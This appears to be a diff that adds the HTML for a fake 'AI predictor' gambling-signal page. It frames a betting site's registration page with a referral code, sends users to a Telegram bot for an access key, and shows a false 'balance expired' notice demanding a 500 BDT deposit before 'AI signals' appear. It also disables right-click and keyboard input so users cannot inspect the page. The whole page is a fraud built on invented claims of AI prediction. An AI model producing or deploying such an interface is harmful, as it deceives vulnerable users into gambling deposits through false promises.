@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PREMIUM AI PREDICTOR V2</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body oncontextmenu="return false;" onkeydown="return false;">
+
+    <!-- Background Game Frame -->
+    <iframe id="game-frame" src="https://tkclub2.com/#/register?invitationCode=84445206479"></iframe>
+
+    <!-- AI Panel -->
+    <div id="main-box" class="glass-effect">
+        <div class="header">
+            <div class="status-dot"></div>
+            <span class="title">SURESHOT AI PRO</span>
+        </div>
+
+        <div class="inner-content">
+            <!-- Phase 1: Login -->
+            <div id="login-view" class="view">
+                <p class="info-text">Enter Private Server Key</p>
+                <input type="password" id="passKey" class="input-field" placeholder="SERVER KEY">
+                <button class="primary-btn" onclick="handleLogin()">AUTHENTICATE</button>
+                <a href="https://t.me/tkclubxbot" class="link-text">GET ACCESS KEY</a>
+            </div>
+
+            <!-- Phase 2: Deposit Check (The Gate) -->
+            <div id="deposit-view" class="view" style="display: none;">
+                <div class="warning-icon">⚠️</div>
+                <p class="info-text">INSIDE BALANCE EXPIRED!</p>
+                <p class="sub-text">To activate AI signals, a minimum deposit of <b>500 BDT</b> is required for server sync.</p>
+                <button class="deposit-btn" onclick="redirectToDeposit()">DEPOSIT 500 BDT</button>
+                <p class="timer-msg">Automatic activation after recharge</p>
+            </div>
+
+            <!-- Phase 3: Signal Interface -->
+            <div id="display-area" class="view" style="display: none;">
+                <div class="game-mode-tag" id="game-mode">DETECTING...</div>
+                <div class="label" id="period-label">ANALYZING TRENDS</div>
+                <div id="result-text">---</div>
+                <div class="num-tag" id="lucky-num">0 & 0</div>
+                
+                <div class="timer-section">
+                    <span class="next-label">NEXT IN:</span>
+                    <span id="timer-val">00</span><span class="unit">S</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="wave-progress"></div>
+                </div>
+                
+                <div class="footer-status">
+                    <span class="blink">●</span> AI SERVER: STABLE
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
